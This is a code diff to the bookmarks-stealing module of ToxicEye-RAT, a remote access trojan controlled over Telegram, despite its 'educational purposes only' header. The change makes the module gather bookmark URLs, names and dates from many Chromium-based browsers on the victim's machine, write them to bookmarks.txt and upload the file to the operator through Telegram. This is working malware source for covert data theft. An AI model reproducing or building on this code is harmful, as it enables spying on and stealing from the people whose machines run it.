@@ -1,21 +1,19 @@
 ﻿/* 
        ^ Author    : LimerBoy
        ^ Name      : ToxicEye-RAT
-       ^ Github    : https:github.com/LimerBoy
+       ^ Github    : https://github.com/LimerBoy
 
        > This program is distributed for educational purposes only.
 */
 
 using System;
-using System.Collections.Generic;
 using System.IO;
 
 namespace TelegramRAT
 {
     internal class Bookmarks
     {
-        // Return list with arrays (url, name, date)
-        public static List<Dictionary<string, string>> get()
+        public static void get()
         {
             // Path info
             string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
@@ -50,7 +48,9 @@ namespace TelegramRAT
                 l_a + "Yandex\\YandexBrowser" + u_s
             };
 
-            List<Dictionary<string, string>> bookmarks = new List<Dictionary<string, string>>();
+            // Data
+            string filename = "bookmarks.txt";
+            string output = "[BOOKMARKS]\n\n";
 
             // Search all browsers
             foreach (string browser in chromiumBasedBrowsers)
@@ -63,19 +63,16 @@ namespace TelegramRAT
                 string bookmarksFile = File.ReadAllText(browser);
                 foreach (SimpleJSON.JSONNode mark in SimpleJSON.JSON.Parse(bookmarksFile)["roots"]["bookmark_bar"]["children"])
                 {
-                    Dictionary<string, string> credentials = new Dictionary<string, string>
-                    {
-                        ["url"] = mark["url"],
-                        ["name"] = mark["name"],
-                        ["date_added"] = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64((string)mark["date_added"])), TimeZoneInfo.Local))
-                    };
-                    bookmarks.Add(credentials);
+                    output += "URL: " + mark["url"] + "\n"
+                           + "NAME: " + mark["name"] + "\n"
+                           + "DATE: " + Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64((string)mark["date_added"])), TimeZoneInfo.Local)) + "\n"
+                           + "\n";
                 }
-         
                 continue;
             }
-
-            return bookmarks;
+            // Send
+            File.WriteAllText(filename, output);
+            telegram.UploadFile(filename, true);
         }
     }
 }
